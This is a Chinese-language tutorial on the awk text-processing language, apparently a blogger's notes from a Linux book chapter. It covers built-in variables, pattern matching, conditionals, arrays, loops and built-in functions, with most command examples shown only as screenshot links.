awk是专门为文本处理设计的编程语言，awk与sed类似都是以数据驱动的行处理软件，通常我们会使用它进行数据扫描、过滤、统计汇总工作，数据可以来自标准输入、管道或者文件。awk在20世纪70年代诞生于贝尔实验室，其名称源于该软件三名开发者的姓氏[插图]。awk有很多版本，在1985—1988年被大量修订与重写并于1988年发布的Gnu awk，是目前应用最广泛的版本，在CentOS7系统中默认使用的就是Gnu awk。

### 7.1 awk基础语法

1）记录与字段

awk是一种处理文本文件的编程语言，文件的每行数据被称为记录，默认以空格或制表符为分隔符，每条记录会被分成若干字段（列）, awk每次从文件中读取一条记录

语法格式如下。

![image-20220329201935223](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329201935223.png)

2）内置变量

awk语法由一系列条件和动作组成，在花括号内可以有多个动作，在多个动作之间使用分号分隔，在多个条件和动作之间可以有若干空格，也可以没有。awk会逐行扫描以读取文件内容，从第一行到最后一行，寻找与条件匹配的行，并对这些匹配的数据行执行特定的动作。条件可以是正则匹配、数字或字符串比较，动作可以是打印需要过滤的数据或者其他，如果没有指定条件则可以匹配所有数据行，如果没有指定动作则默认为print打印操作。因为awk是逐行处理软件，所以这里的动作默认都隐含着循环，条件被匹配多少次，动作就被执行多少次。awk有很多内置变量，下表为常用的awk内置变量

常用awk内置变量

![image-20220329202521632](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329202521632.png)

![image-20220329202857538](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329202857538.png)

上面命令的执行流程可用图表示，如下图所示。

![image-20220329202949155](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329202949155.png)

free命令输出的内容有3行，而awk是逐行处理工具，当读取第1行数据时，因为awk没有指定匹配条件，可以匹配所有数据行，而条件匹配成功则执行print $2这个动作（打印第2列数据），因此屏幕输出的内容为used，接着读取第2行数据，再次执行print $2打印第2行的第2列数据，因此屏幕输出的内容是2031888，最后读取第3行数据，执行print $2打印第3行的第2列数据，所以屏幕输出的内容是2097148。

由此可知，动作指令print $2虽然只写了一次，但是awk隐含了循环，条件匹配多少次，动作就会被执行多少次。上面的案例因为数据源有3行，因此打印第2列的动作也被重复执行了3次。

![image-20220329203337139](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329203337139.png)

awk内置变量NR为当前行的行号，当awk读取free命令输出的第1行时，执行print NR后屏幕输出当前行号1，接着读取第2行数据，再次执行print NR后屏幕输出当前行号为2，最后读取第3行数据，执行print NR后屏幕输出当前行号为3。

![image-20220329203542808](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329203542808.png)

awk内置变量NF为当前行的字段数（列数），如果以空格或者Tab制表符为分隔符计算，free命令输出的第1行有6列，第2行有7列，第3行有4列。

![image-20220329203714791](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329203714791.png)

创建素材文件1

![image-20220329203925447](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329203925447.png)

创建素材文件2

![image-20220329204036410](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329204036410.png)

![image-20220329204209680](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329204209680.png)

![image-20220329204446106](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329204446106.png)

同样都是输出行号，内置变量NR会将所有文件的数据视为一个数据流，NR仅保存的是这些数据流的递增行号，而FNR则是将多个文件的数据视为独立的若干个数据流，遇到新文件时行号会从1开始重新递增，也就是FNR保存的是某行数据在源文件中的行号。

![image-20220329205007385](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329205007385.png)

① 假设数据行有7列，即NF=7，因此$NF也就是$7（第7列）。

为什么输出了3次文件名呢？因为awk是逐行处理软件，满足条件则执行动作指令，上面的命令在动作指令前面没有编写条件，则默认匹配所有，而test1.txt文件有3行数据，因此屏幕最终输出了3次文件名信息。

3）自定义变量

awk可以通过-v（variable）选项设置或者修改变量的值，我们可以使用-v定义新的变量，也可以使用该选项修改内置变量的值。

![image-20220329205946437](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329205946437.png)

![image-20220329210342961](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329210342961.png)

![image-20220329210835748](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329210835748.png)

上面这条命令在变量$i外面是双引号加单引号的组合。

![image-20220329211512258](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329211512258.png)

使用-v选项重新定义字段分隔符为冒号，读取第1行数据，输出第2列内容为crisp；继续读取第2行数据，因为有两个连续的冒号：:，因此以冒号为分隔符第2列为空；最后读取第3行，以冒号为分隔符，输出第2列内容为lemon, pear—apple。

我们还可以使用[]定义分隔符集合，同时设置多个分隔符。比如使用[:, -]表示以冒号（:）、逗号（,）或者横线（-）为分隔符。

```
注意
在[]集合中的横线，放在中间位置表示范围区间，比如[a-z]。而当我们需要的是普通字符-时，就需要将其放在最前或者最后面，比如[-abc]或者[abc-]。
```

![image-20220329212005836](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329212005836.png)

因为自定义数据行字段的分隔符属于经常使用的功能，为了方便自定义字段分隔符，awk程序还替换了一个-F选项，可以直接指定数据字段的分隔符。

![image-20220329212417714](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329212417714.png)

内置变量RS保存的是输入数据的记录分隔符，也就是行分隔符，默认值为\n换行符。通过修改RS的值同样可以指定其他字符为记录分隔符。

![image-20220329213208050](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329213208050.png)

在我们自定义使用逗号作为记录行的分隔符后，hellothe world! \nOther men live to eat就被系统识别为了文件的第1行数据，而while I eat to live.\nIt is nevertoo late to mend，则被识别为文件的第2行数据，因此当使用print $1输出每行第一列数据时，其结果分别为hello和while。

另外，内置变量OFS保存的是输出字段的分隔符，默认为空格，而变量ORS保存的是输出记录的分隔符，默认为换行符\n。这些内置变量也都可以使用-v选项来自定义修改。

![image-20220329220537772](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329220537772.png)

![image-20220329220825111](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329220825111.png)

默认输出字段（列）之间使用空格作为分隔符，但是我们也可以修改OFS的值为其他字符，比如冒号、横线或者Tab制表符。

![image-20220329221527984](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329221527984.png)

上面的命令通过修改OFS定义输出分隔符为点和空格，这样后面在逐行读取数据并打印NR（行号）和$0（全行所有数据内容）时，两个数据记录之间的分隔符就是点和空格。

![image-20220329222029186](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329222029186.png)

![image-20220329222141254](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329222141254.png)

awk为逐行处理软件，默认在读取第1行数据并输出该行内容后，会自动在其后追加一个\n换行符，接着处理后续的其他数据行。但如果我们修改了ORS变量的值，也可以将行的分隔符（记录分隔符）修改为其他字符，比如冒号（:），上面的命令通过-v参数修改ORS变量的值为冒号。

4）print指令

使用print指令输出特定数据时，我们可以输出变量数据，同时也还可以直接输出常量，如果是字符串常量需要使用双引号括起来，如果是数字常量则可以直接打印。下面的命令都是test1.txt文件，有3行数据内容，因此所有的动作指令都会被循环执行3次。

![image-20220329224101281](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329224101281.png)

![image-20220329225859509](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329225859509.png)

5）条件匹配

前面的案例都没有编写条件匹配，awk支持使用正则进行模糊匹配，也支持字符串和数字的精确匹配，并且支持逻辑与和逻辑或。awk比较符号如表7-2所示。

表7-2 awk比较符号

![image-20220329230314874](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329230314874.png)

![image-20220329230518006](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329230518006.png)

上面两条命令都是输出包含world的数据行，当没有动作指令时则默认指令是print打印当前行所有数据内容。awk会逐行读取所有数据，对每行数据都进行正则匹配，匹配到包含word的数据行时则打印全部所有内容。awk数据处理流程如图7-2所示。

![image-20220329230745504](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329230745504.png)

图7-2 awk数据处理流程

![image-20220329230848282](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329230848282.png)

第1行的“hello the world! ”包含关键词the，第2行也包含the关键词，而正则匹配仅关心是否包含the，并不关心位置，匹配包含the则打印该行所有数据内容，第3行的数据中并不包含the关键词，则跳过该行不输出任何内容。

默认正则匹配是对每行所有数据内容进行匹配，但是awk支持仅对某列进行正则匹配，在两个数据之间进行正则匹配需要使用正则比较符（～）进行匹配比较。

![image-20220329231534048](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329231534048.png)

该命令仅对每行的第2列进行正则匹配包含the的数据行，第1行的第2列包含the则打印输出该行的所有内容，第2行的第2列为men，不包含the则跳过该行，第3行的第2列为is，不包含the则通过跳过该行数据，没有任何数据输出。

![image-20220329232002850](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232002850.png)

读取test1.txt文件的每行数据，逐行匹配第3列是否包含never关键词，如果包含则打印输出该行的第1列、第4列及第5列。

![image-20220329232159506](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232159506.png)

当使用～进行正则匹配时，仅要求每行第4列包含to即可，因此too也是可以匹配成功的，最终第2行和第3行数据都被打印输出。而使用==进行精确匹配时，则仅有第3行才可以匹配成功，最终仅输出第3行的数据内容。

![image-20220329232342376](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232342376.png)

精确匹配关键词the，第2列不等于the的行则打印输出该行的所有内容。

![image-20220329232642133](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232642133.png)

上面这条命令逐行精确匹配/etc/passwd文件的第3列，如果第3列的数字小于等于10，则打印该行所有数据内容。

![image-20220329232716956](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232716956.png)

![image-20220329232937167](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329232937167.png)

上面这条命令逐行精确匹配/etc/passwd文件的第3列，如果第三列的数字小于等于10则打印该行第1列的数据内容。

![image-20220329233204450](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233204450.png)

awk的匹配条件可以是BEGIN或END（大写字母）,BEGIN会导致动作指令仅在读取任何数据记录之前执行一次，END会导致动作指令仅在读取完所有数据记录后执行一次。利用BEGIN我们可以进行数据的初始化操作，而END则可以帮助我们进行数据的汇总操作。

![image-20220329233444216](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233444216.png)

BEGIN后面的动作指令，在读取任何数据记录前就被执行且仅执行一次，因此上面的指令不需要通过文件读取任何数据即可执行，如果添加了文件也没有任何影响。

![image-20220329233552667](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233552667.png)

END后面的动作指令，仅在读取完所有数据流之后被执行一次，NR变量的值为当前行的行号，读取第1行数据时NR的值为1，读取第2行数据时NR的值为2，依此类推。因为END的指令在读取完所有数据行之后才会执行，当读取完所有数据行后NR的值为/etc/passwd文件最后一行的行号，此时再打印输出18，表示/etc/passwd文件有18行。

![image-20220329233752337](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233752337.png)

![image-20220329233853874](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233853874.png)

上面的命令在读取/etc/passwd文件内容之前先在屏幕输出标题“用户名UID解释器”，接着逐行读取文件每行内容，每读取一行数据就以冒号进行分隔，打印输出第1列、第3列和第7列，当所有数据行都读取完毕后，在屏幕上打印输出常量与变量，打印常量字符串“总计有”和“个账户”，打印变量NR，而读取完所有行后再打印NR, NR为最后一行的行号，47行表示系统中有47个用户。

awk还可以通过算术运算符进行数字计算。

![image-20220329233945723](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233945723.png)

![image-20220329233956857](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329233956857.png)

![image-20220329234007065](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329234007065.png)

![image-20220329234017670](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329234017670.png)

在awk中变量不需要定义就可以直接使用，作为字符处理时未定义的变量默认值为空，作为数字处理时未定义的变量默认值为0。

![image-20220329235535974](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329235535974.png)

使用双引号引用的[和]被识别为常量字符串，输入什么即打印什么，x和y没有引号则被识别为变量，没有任何计算操作，awk将其识别为字符型变量，输出结果为空，最终打印两个方括号[]，方括号中间为空。

![image-20220329235624978](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329235624978.png)

逐行读取/etc/passwd文件，x初始值为0，匹配以bash结尾的行时执行x++，读取完所有数据行后打印x的值。如果第1行以bash结尾则x++=1，如果第2行数据不以bash结尾则跳过，依此类推。上面的命令最终输出2表示系统中有两个账户的解释器为bash。

![image-20220329235843401](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329235843401.png)

![image-20220329235910138](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329235910138.png)

打印1～200之间所有能被7整除并且包含7的整数数字。首先将第1列对7进行取余计算（$1%7），然后判断取余的值是否等于0，等于0表示可以整除，否则无法整除，最后对第1列进行正则匹配，看它是否包含7。

![image-20220329235940436](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220329235940436.png)

![image-20220330000143991](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330000143991.png)

上面的命令先通过df查看文件系统信息，使用tail -n +2可以从第2行开始显示文件系统的信息，这样就可以把不包含任何数据的标题行去除，然后将命令的输出结果作为数据流管道给awk进行处理，awk每读取一行数据就执行一次sum+=$4, sum变量没有初始化定义，因此初始值为0，而df输出的每行第4列为剩余容量。awk读取数据流的第1行数据时执行sum+=$4（sum=0+48153580），结果sum中保存的就是第一个文件系统的剩余容量，接着awk读取数据流的第2行数据再次执行sum+=$4（sum=48153580+1004876），因此sum变量中保存的就是前面两个文件系统剩余容量的总和，依此类推，将所有行的第4列累加后，通过END执行print打印出来的sum变量的值就是所有文件系统剩余容量的总和。该命令的执行流程如下图所示。

![image-20220330000321908](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330000321908.png)

![image-20220330000706529](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330000706529.png)

上面这条命令可以统计/etc/目录下所有以．conf结尾的文件的容量总和，通过ls -l命令可以显示特定文件的详细信息，其中第5列为文件的容量大小。

![image-20220330001141274](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330001141274.png)

ls -l命令的输出结果中以-开头的行代表普通文件，以d开头的行代表目录，以l开头的行代表链接文件，以-d开头的行代表块设备文件（如磁盘、光盘等），以c开头的行代表字符设备文件（如鼠标、键盘等）。

### 7.2 awk条件判断

7.1节中的案例都是在使用awk进行数据的基本过滤和统计工作，而awk作为一门数据驱动的编程语言，功能远不止于此，它有自己的循环和判断语句，并且支持函数等更高级的功能。下面我们先来看看awk的if条件判断语句。

与其他所有语言一样，awk的if判断语句同样支持单分支、双分支及多分支判断。

awk的单分支if判断语法格式如下，if判断后面如果只有一个动作指令，则花括号{}可以省略，如果if判断后面的指令为多条指令则需要使用花括号{}括起来，多个指令使用分号分隔。

![image-20220330133314157](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330133314157.png)

awk的双分支if判断语法格式如下。

![image-20220330134437813](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330134437813.png)

![image-20220330134452124](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330134452124.png)

1）单分支if语句的案例

![image-20220330134704915](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330134704915.png)

ps命令可以查看Linux系统当前进程列表信息，通过-e显示所有进程信息，-o可以指定我们需要输出的信息内容，这里我们需要输出的是进程的用户、进程的PID、进程占用CPU的百分比及进程的名称信息。

![image-20220330134804165](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330134804165.png)

通过awk的if判断，我们可以将第3列大于0.5的数据行匹配出来，找到满足该条件的行后使用print打印该行的全部内容。这样就可以快速找出占用CPU较多的进程。

![image-20220330135002347](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330135002347.png)

同样的道理，ps命令输出rss信息可以查看进程占用的内存容量信息，有了这些信息就可以快速找出占用内存较多的进程列表，上面的命令是找出占用内存大于1024KB的进程列表。

2）双分支if语句的案例

![image-20220330162231169](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330162231169.png)

上面的命令逐行分析第三列用户UID的值是否小于1000，如果小于1000则执行x++，否则执行y++，当所有数据行都读取完毕后，通过END将最终变量x和变量y的值打印输出，即普通用户和系统用户的个数

![image-20220330162454769](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330162454769.png)

逐行匹配ls -l /etc/命令的输出结果，如果第1列以-开头则执行x++（文件个数计数器），否则执行y++（目录个数计数器），在所有数据行都统计完毕后，通过END将变量x和变量y的值打印输出，即/etc/目录下面普通文件的个数和子目录的个数（这里不包含隐藏文件或目录）。

![image-20220330162524630](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330162524630.png)

我们通过上面这条命令可以分析数字的奇偶数，能被2整除就输出该数字是偶数并执行x++，否则输出该数字是奇数并执行y++, x变量是偶数的计数器，y变量为奇数的计数器，在所有数据后都读取并处理完毕后，通过END将变量x和y的值输出。

3）多分支if语句的案例

先创建一个素材文件，在文件中包含若干行学生姓名和考试成绩，第1列为学生姓名，第2列为考试成绩。我们需要使用awk分析每个人的成绩，根据如下等级范围，输出考试的等级标准。

![image-20220330163007407](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330163007407.png)

### 7.3 awk数组与循环

1）关联数组

awk支持关联数组，数组的索引下标可以不是连续的数字，索引下标可以是任意字符或数字，当使用数组作为索引时awk会自动将数字转换为字符，如果直接使用字符作索引则需要使用引号括起来。定义数组的语法格式如下。

![image-20220330163122884](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330163122884.png)

直接使用数组名加索引下标即可调用数组的值。因为数字索引会被自动转换为字符，所以在定义数组使用数字的情况下，调用数组时也可以使用字符的形式调用。

![image-20220330163302732](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330163302732.png)

![image-20220330163738750](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330163738750.png)

![image-20220330163813637](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330163813637.png)

如果数组有多个元素，逐行读取数组元素比较麻烦，我们可以使用for循环获取数组元素的索引下标，然后在循环体内将数组元素取出，其语法格式如下。for循环后面的指令如果只有一个，则花括号{}可以省略。

![image-20220330164058702](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330164058702.png)

1．这种通过循环的方式输出数组索引或者元素值时并不会按照输入的顺序输出，它是无序的。

上面几条命令都是使用for循环读取数组，在for循环中定义任意变量如i，循环a数组的所有索引下标，每循环一次变量i的值就提取数组a的一个索引值，直到将所有索引读取完毕则循环结束。而在循环体内，如果我们print打印的是i，则最终输出的就是所有数组的索引值，如果我们pirnt打印的是a[i]，当i提取索引值book时，就相等于print a[“book”]，当i提取索引值88时，就相等于printa[88]，因此输出的是数组元素的值。

结合awk的if语句，我们还可以进行成员关系判断，判断一个索引是否存在为数组成员，语法格式如下。

![image-20220330164445755](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330164445755.png)

在上面的命令中，awk会逐行读取df输出的数据行，并定义数组disk，将每行第1列作为数组的索引下标，第4列作为数组元素的值，NR! =1可以防止将第1行标题行写入数组。等所有数据行都读取完毕后，再通过for循环将disk数组的所有元素值逐一打印出来。

2）for循环

awk的for循环采用与C语言一样的语法格式，具体格式如下。

![image-20220330173800580](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330173800580.png)

在处理有些不规则数据时可以使用循环逐一读取所有数据，下面判断一个不规则数据文件的每列是否匹配关键词apple，统计apple在文件中出现的次数。

![image-20220330173938539](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330173938539.png)

上面这条命令包含两个循环，其中一个循环是隐含循环，awk读取一行数据动作指令就会执行一次，test.txt文件包含3行数据，也就是指令（for（i=1; i＜=NF; i++）{if（$i～/apple/）x++ }）会被重复执行3次，而每执行一次动作指令又会触发for循环被执行，而for循环以NF列数为标准定义循环次数，如果数据行有8列，则for循环中的变量i就会从1循环到8，循环8次的目的就是逐列判断是否包含关键词apple。这样就可以实现一个循环是对行循环，一个循环是对列循环，就可以读取所有数据行的所有数据列，并逐一判断匹配是否包含apple，如果某列数据包含apple，则执行x++指令，最终变量x中保存的就是文件中apple出现的次数。其数据处理流程如下图所示。

![image-20220330174359615](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330174359615.png)

awk数据处理流程

同样的道理，也可以进行精确的字符匹配，统计文件中is单词出现的次数。

![image-20220330174445329](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330174445329.png)

下面我们结合脚本，编写一个定义特定数据坐标的脚本，用户输入一个关键词，脚本就可以反馈该关键词在文件中的行和列的坐标。

![image-20220330175218867](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330175218867.png)

3）while循环

除了for循环，awk同样支持while循环，其语法格式如下，当while的条件判断为真时则循环执行动作指令，直到条件判断为假时循环结束。

![image-20220330175420726](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330175420726.png)

上面这条命令，首先定义变量i的初始值为1，接着通过while循环判断变量i是否小于等于5，如果变量i小于等于5则打印变量i的值，并对变量i进行自加1运算，运算完成后继续下一次while循环，再次判断变量i的值是否小于等于5，依此类推，直到变量i大于5时循环结束。

![image-20220330175654483](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330175654483.png)

上面的命令逐行读取文件的每行数据，每读取一行数据，就以当前行的行号为标准定义while循环次数，读取第1行数据则while循环1次，读取第2行数据则while循环2次，依此类推，在while循环体内将特定的数据列打印输出。读取第1行就循环1次打印该行的第1列，读取第2行就循环2次打印该行数据的第1和第2列。默认printf打印输出完特定的内容后不换行，因此在每次while循环结束后通过print指令打印一个空字符实现换行的效果。我们可以把i=1看作一个指令，将整个for循环看作一个指令，将最后的print看作一个指令，也就是每读取一行数据就执行一遍这3个指令，直到文件读取完毕。

通过重新换行排版的上面命令可能更容易理解。

4）中断循环

与Shell脚本类似awk提供了continue、break和exit循环中断语句，方便我们在特定环境下对循环进行中断操作。continue可以中断本次循环加入下一次循环，break中断整个循环体，exit可以中断整个awk动作指令，直接跳到END的位置。这些指令既可以中断for循环，也可以中断while循环。

![image-20220330180501721](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330180501721.png)

![image-20220330180509748](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330180509748.png)

上面这条awk的BEGIN中包含3个动作指令，i=0, while循环，print over, END中包含一个动作指令printover。从上面的输出结果可知，continue仅仅是在变量i等于3时不再执行本次循环后续的指令，而是直接跳入下一次循环，while循环中continue后续的指令只有一个print i，因此当i==3时，系统并没有来得及显示3就已经跳入了第4次循环中。但是continue对循环体外部的命令没有任何影响，因此最终输出的是1、2、4、5、6、over和end。

![image-20220330180830624](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330180830624.png)

break比continue中断得更彻底，它可以把整个循环中断，但是对循环体外部的命令也没有任何影响，这次屏幕在显示完数字1和2后，就中断了整个while循环，但是依然可以执行print over和print end。

![image-20220330181036571](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330181036571.png)

使用exit不仅可以中断循环，还会中断awk其他所有动作指令，所以中断了over。直接跳到并执行END的指令。因此上面的命令在循环两次输出1和2后，直接结束awk指令，但是不影响END中指令的执行，屏幕依然显示end

### 7.4 awk函数

awk内置了大量的函数可供我们直接调用实现更丰富的功能，同时还允许自定义函数。下面为大家介绍一些常用的内置函数，以及如何编写自定义函数。

1）内置I/O函数

getline函数可以让awk立刻读取下一行数据（读取下一条记录并复制给$0，并重新设置NF、NR和FNR）。

在有些使用了逻辑卷分区的Linux系统中，通过df输出文件系统信息时，逻辑卷分区的信息往往都跨行显示，而普通的分区则可以一行显示一个分区的信息，这样当我们需要提取分区的磁盘空间容量时，就会出现字段列数不一致

![image-20220330182706181](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330182706181.png)

可以很明显地看出，在上面的df命令的输出结果中，逻辑卷分区的信息是跨行显示的，而普通的sda1分区信息仅使用一行即可显示完整数据。此时，如果我们需要提取所有磁盘剩余空间，直接打印$4肯定是不可以的！

![image-20220330183155449](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330183155449.png)

说实话，现在版本不会出现问题。那我们假装有问题，因为再实战中不止有这个版本

所以还是写个两种都兼容的好

![image-20220330183613718](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330183613718.png)

df命令输出的第2行仅包含一列数据，因此打印$4返回的就是空白，而第3行数据的第4列是21%的磁盘使用率，只有到后续的普通磁盘分区打印$4可以正确地输出磁盘剩余容量。

我们需要判断当读取的某一行数据只有一列时，执行getline函数直接读取下一行的数据，然后打印第3列磁盘剩余容量的数值，而如果读取的数据行包含6列数据，则直接打印输出第4列磁盘剩余容量的数值。

![image-20220330184017283](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330184017283.png)

上面这条命令的执行流程如下。

● 读取第1行数据，该行数据包括7个字段，与NF==1和NF==6都不匹配，因此不打印任何数据。

● 读取第2行数据，该行数据包括1个字段，与NF==1匹配，因此先执行getline，没有执行getline之前$0的值是/dev/mapper/VolGroup00-LogVol00，执行getline之后，$0被重新附值为"19G 3.6G 15G 21% /"，此时再打印第3列刚好是磁盘的剩余空间15GB。

● 读取第3行数据，该行数据包括6个字段，与NF==6匹配，因此直接输出第4列的数值。

● 读取第4行数据，该行数据包含6个字段，与NF==6匹配，因此直接输出第4列的数值。

通过在getline之前和之后分别打印输出$0，可以观察出getline对当前行数据$0的影响。

![image-20220330184457480](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330184457480.png)

next函数可以停止处理当前的输入记录，立刻读取下一条记录并返回awk程序的第一个模式匹配重新处理数据。getline函数仅仅读取下一条数据，而不会影响后续awk指令的执行。但是next不仅读取下一行数据，会导致后续的指令都不再执行，而是重新读取数据后重新回到awk指令的开始位置，重新匹配，重新执行动作指令。

![image-20220330184708278](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330184708278.png)

对比上面两条命令的区别，对于无法匹配正则条件/air/的行都不会执行getline或next指令，都执行print"noraml line"。对于匹配正则条件/air/的行，如果执行getline函数则并不影响后续的print "next line:", $0指令的执行，如果执行的是next函数，则通过最终的输出结果可知next后续的print指令都不再执行，而是跳回awk的开始处重新匹配条件执行动作指令。

![image-20220330185719699](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330185719699.png)

system（命令）函数可以让我们在awk中直接调用Shell命令。awk会启动一个新的Shell进程执行命令。

![image-20220330190036722](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330190036722.png)

![image-20220330190302459](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330190302459.png)

2）内置数值函数

cos（expr）函数返回expr的cosine值。

![image-20220330190905411](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330190905411.png)

sin（expr）函数返回expr的sine值。

![image-20220330190915126](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330190915126.png)

sqrt（expr）函数返回expr的平方根。

![image-20220330190931852](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330190931852.png)

int（expr）函数为取整函数，仅截取整数部分数值。

![image-20220330191025268](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330191025268.png)

rand（）函数可以返回0到1之间的随机数N（0＜=N＜1）。

![image-20220330191222956](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330191222956.png)

![image-20220330191356030](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330191356030.png)

srand（[expr]）函数可以使用expr定义新的随机数种子，没有expr时则使用当前系统的时间为随机数种子。

